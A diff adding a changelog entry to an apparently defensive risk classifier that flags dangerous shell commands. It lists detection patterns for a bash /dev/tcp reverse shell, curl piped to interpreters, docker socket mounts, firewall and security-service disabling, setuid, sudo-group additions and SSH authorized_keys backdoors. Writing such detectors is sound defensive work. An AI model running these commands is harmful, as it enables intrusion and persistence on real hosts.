@@ -4,6 +4,59 @@
 
 (no entries — next release window)
 
+## [1.10.54] - 2026-05-02
+
+Risk classifier catalog gains 12 patterns drawn from real
+sandbox-escape and post-exploit playbooks.
+
+### Added (critical)
+- **`docker-sock-mount`** — `-v /var/run/docker.sock:...`.
+  Mounting the docker socket into a container hands root on
+  the host to whoever runs that container.
+- **`curl-pipe-interpreter`** — `curl|python` /
+  `wget|perl|ruby|node|php`. Same shape as the existing
+  curl-pipe-shell rule but for non-shell interpreters.
+- **`reverse-shell`** — `bash -i >& /dev/tcp/host/port`.
+  bash's `/dev/tcp` pseudo-device opens a TCP socket without
+  netcat — the canonical reverse-shell one-liner.
+
+### Added (high)
+- **`firewall-disable`** — `iptables -F`, `ufw disable/reset`,
+  `nft flush ruleset`.
+- **`systemctl-disable-critical`** — `systemctl stop|disable|
+  mask` on sshd / firewalld / ufw / auditd / apparmor /
+  fail2ban. Non-critical services (nginx, etc) stay
+  unflagged.
+- **`pip-break-system`** — `pip install
+  --break-system-packages`. PEP 668 override; routinely
+  produces unbootable systems.
+- **`npm-global-install`** — `npm install -g/--global` /
+  `yarn global add`. System-wide write that can shim
+  binaries.
+- **`suid-set`** — `chmod u+s` / setuid bit. Privilege
+  escalation primitive.
+- **`usermod-sudo`** — `usermod -aG / gpasswd -a` adding to
+  sudo / wheel / root / docker groups. Detects both arg
+  orders.
+- **`authorized-keys-append`** — `>> ~/.ssh/authorized_keys`.
+  Distinct from system-files (which catches /etc/* writes);
+  this is the classic SSH-key backdoor.
+
+### Added (medium)
+- **`git-config-global`** — `git config --global / --system`.
+  Persistent settings drift.
+- **`pkg-config-set`** — `npm/yarn/pnpm config set` (registry
+  / token writes).
+- **`netcat-listen`** — `nc -l/-lp/-lvp/--listen` and `ncat`
+  variants. Combined-short-options handled (`-lp`, `-lvp`).
+
+Catalog grew from 28 → 40 patterns. 17 new tests in
+`tests/risk-classifier.test.js` (83 total in that suite,
+was 67); each new rule has a positive case + a benign
+near-miss to lock in the boundary.
+
+Suite 156/156. All four drift phases clean.
+
 ## [1.10.53] - 2026-05-02
 
 `POST /risk/check` — daemon-side classifier endpoint. Web UI
